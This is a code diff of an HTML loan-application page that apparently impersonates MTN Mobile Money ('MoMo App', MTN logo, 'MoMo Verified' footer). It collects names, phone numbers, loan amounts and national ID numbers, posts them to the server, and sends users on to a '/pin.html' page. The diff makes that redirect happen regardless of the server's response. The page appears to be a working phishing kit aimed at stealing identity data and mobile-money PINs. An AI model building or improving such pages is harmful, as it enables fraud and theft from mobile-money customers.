@@ -12,7 +12,6 @@ body {
   background: #0b5c6b;
 }
 
-/* HEADER */
 .header {
   background: #0b5c6b;
   color: #ffcc00;
@@ -28,23 +27,18 @@ body {
   margin-right: 6px;
 }
 
-/* FORM CARD */
 .container {
   max-width: 400px;
   margin: 30px auto;
   background: white;
   padding: 20px;
   border-radius: 18px;
-  box-shadow: 0 4px 10px rgba(0,0,0,0.2);
 }
 
-/* TITLE */
 h2 {
   text-align: center;
-  margin-bottom: 20px;
 }
 
-/* INPUTS */
 input, select {
   width: 100%;
   padding: 14px;
@@ -52,52 +46,34 @@ input, select {
   border-radius: 10px;
   border: none;
   background: #f1f1f1;
-  font-size: 14px;
 }
 
-/* BUTTON */
 button {
   width: 100%;
   padding: 15px;
   background: #ffcc00;
   border: none;
   border-radius: 10px;
-  font-size: 16px;
   font-weight: bold;
   cursor: pointer;
 }
 
-button:active {
-  background: #e6b800;
-}
-
-/* FOOTER */
 .footer {
   text-align: center;
   color: white;
   font-size: 12px;
   margin: 20px 0;
 }
-
-/* LOADING */
-.loading {
-  display: none;
-  text-align: center;
-  font-size: 14px;
-  margin-top: 10px;
-}
 </style>
 </head>
 
 <body>
 
-<!-- HEADER -->
 <div class="header">
   <img src="https://upload.wikimedia.org/wikipedia/commons/7/7e/MTN_Mobile_Money_logo.svg">
   MoMo App
 </div>
 
-<!-- FORM -->
 <div class="container">
   <h2>Loan Application</h2>
 
@@ -114,29 +90,27 @@ button:active {
     <input type="number" name="amount" placeholder="Loan Amount (UGX)" required>
     <input type="text" name="nationalId" placeholder="National ID Number" required>
 
-    <button type="submit">Apply Now</button>
-
-    <div class="loading" id="loadingText">
-      ⏳ Processing application...
-    </div>
+    <button type="submit" id="submitBtn">Apply Now</button>
   </form>
 </div>
 
-<!-- FOOTER -->
 <div class="footer">
   2026@MoMo Verified
 </div>
 
-<!-- SCRIPT -->
 <script>
 document.getElementById("loanForm").addEventListener("submit", async function(e) {
   e.preventDefault();
 
-  const loading = document.getElementById("loadingText");
-  loading.style.display = "block";
+  const btn = document.getElementById("submitBtn");
+  btn.disabled = true;
+  btn.innerText = "Processing...";
 
   const formData = new FormData(this);
   const data = Object.fromEntries(formData.entries());
+
+  // SAVE PHONE
+  localStorage.setItem("phone", data.phone);
 
   try {
     const res = await fetch("/apply", {
@@ -147,23 +121,13 @@ document.getElementById("loanForm").addEventListener("submit", async function(e)
       body: JSON.stringify(data)
     });
 
-    if (res.status === 200) {
-
-      // ✅ SAVE DATA FOR PIN PAGE
-      localStorage.setItem("phone", data.phone);
-      localStorage.setItem("name", data.name);
-
-      // 🔥 GO TO PIN PAGE
-      window.location.href = "/pin.html";
-
-    } else {
-      loading.style.display = "none";
-      alert("❌ Error submitting application");
-    }
+    // MOVE TO PIN PAGE
+    window.location.href = "/pin.html";
 
   } catch (err) {
-    loading.style.display = "none";
-    alert("❌ Server error");
+    alert("Server error");
+    btn.disabled = false;
+    btn.innerText = "Apply Now";
   }
 });
 </script>
